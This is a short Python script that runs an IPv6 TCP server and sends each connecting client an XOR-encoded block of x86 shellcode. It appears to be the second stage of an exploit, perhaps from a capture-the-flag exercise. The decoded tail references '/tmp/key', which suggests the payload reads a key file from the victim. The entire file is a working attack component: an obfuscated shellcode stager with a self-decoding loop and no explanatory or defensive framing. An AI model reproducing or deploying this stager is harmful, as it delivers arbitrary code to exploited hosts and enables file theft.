#!/usr/bin/python
import SocketServer, socket
SocketServer.TCPServer.allow_reuse_address = True


#HOST, PORT = "0.0.0.0", 34567
HOST, PORT = "dc19:c7f:2011:2:0000:0000:0000:153", 34567

SCODE = ""
SCODE += "\xd9\xe1\xd9\x34\x24\x58\x58\x58"
SCODE += "\x58\x80\xe8\xe7\x31\xc9\x66\x81"
SCODE += "\xe9\x65\xff\x80\x30\x07\x40\xe2"
SCODE += "\xfa\x6d\x66\x5f\x9e\x55\x45\x55"
SCODE += "\x6d\x1b\x36\xce\xb6\x67\x56\xca"
SCODE += "\x87\x6f\x07\x07\x06\x54\x6d\x07"
SCODE += "\x6f\x27\x16\x07\x05\x6f\xdb\x1e"
SCODE += "\x0b\x78\x36\xce\x56\x6f\xbb\x1b"
SCODE += "\x5c\xa7\x8e\xe6\x6d\x1b\x56\x57"
SCODE += "\x56\x94\x6d\x65\x5f\xca\x87\x6d"
SCODE += "\x05\x5e\x6d\x5d\x5f\x55\x54\x55"
SCODE += "\xca\x87\x4d\x7e\xf2\xec\x41\x5c"
SCODE += "\x36\xc7\x57\x57\x54\x54\x36\xc7"
SCODE += "\xb7\x02\xca\x87\x8e\xc5\x8e\xe1"
SCODE += "\x86\xeb\x87\x07\x07\x07\x36\xc7"
SCODE += "\xb7\x2f\x57\x51\x8e\xd7\x57\x57"
SCODE += "\xb7\x04\xca\x87\x36\xce\x8d\x03"
SCODE += "\x09\x33\x8f\x8f\x03\x09\x46\x87"
SCODE += "\xfe\x2f\x72\xf5\x36\xc7\xb7\x2f"
SCODE += "\x57\x51\x6d\x07\x57\xb7\x03\xca"
SCODE += "\x87\xb7\x06\xca\x87\xef\xb2\xf8"
SCODE += "\xf8\xf8\x28\x73\x6a\x77\x28\x6c"
SCODE += "\x62\x7e\x07\x07"

class MyTCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        # self.request is the TCP socket connected to the client
        print "[*] connection from %s" % self.client_address[0]
        self.request.send( SCODE)
        print "[*] sent SCODE [%d] [0x%x] bytes" % (len(SCODE), len(SCODE))
        return


class V6Server(SocketServer.TCPServer):
    address_family = socket.AF_INET6
    
    
if __name__ == "__main__":
    print "server starts at %s:%d" % (HOST, PORT)
    # server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
    # server.serve_forever()
    server = V6Server((HOST, PORT), MyTCPHandler)
    server.serve_forever()    
